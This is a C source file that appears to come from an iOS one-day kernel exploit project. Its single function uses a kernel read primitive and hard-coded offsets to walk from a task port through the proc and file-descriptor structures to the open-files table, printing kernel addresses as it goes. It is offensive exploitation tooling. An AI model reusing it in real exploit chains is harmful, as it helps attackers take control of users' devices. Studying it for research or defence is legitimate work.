//
//  get_fd_ofiles.c
//  1_day_iOS
//
//  Created by System on 30/11/2020.
//  Copyright Â© 2020 System. All rights reserved.
//

#include "get_fd_ofiles.h"
#include "read.h"

int get_fd_ofiles_addr(uint64_t task_port,uint64_t * fd_ofiles){
    uint64_t task;
    uint64_t proc;
    uint64_t filedesc;
    uint64_t fd_ofiles_;
    
    if(!Read_data_64(task_port + offset_ipc_port_ip_kobject, &task)){
        printf("ERROR!! failed on reading task address\n");
        return 0;
    }
    printf("recevied task address : 0x%llx\n",task);
    if(!Read_data_64(task + offset_task_bsd_info,&proc)){
        printf("ERROR!! failed on reading proc address\n");
        return 0;
    }
    printf("recevied proc address : 0x%llx\n",proc);
    if(!Read_data_64(proc + +offset_proc_p_fd,&filedesc)){
        printf("ERROR!! failed on reading filedesc address\n");
        return 0;
    }
    printf("recevied filedesc address : 0x%llx\n",filedesc);
    if(!Read_data_64(filedesc + offset_filedesc_fd_ofiles, &fd_ofiles_)){
        printf("ERROR!! failed on reading fd_ofiles address\n");
        return 0;
    }
    printf("recevied fd_ofiles address : 0x%llx\n",fd_ofiles_);
    *fd_ofiles = fd_ofiles_;
    return 1;
    
}
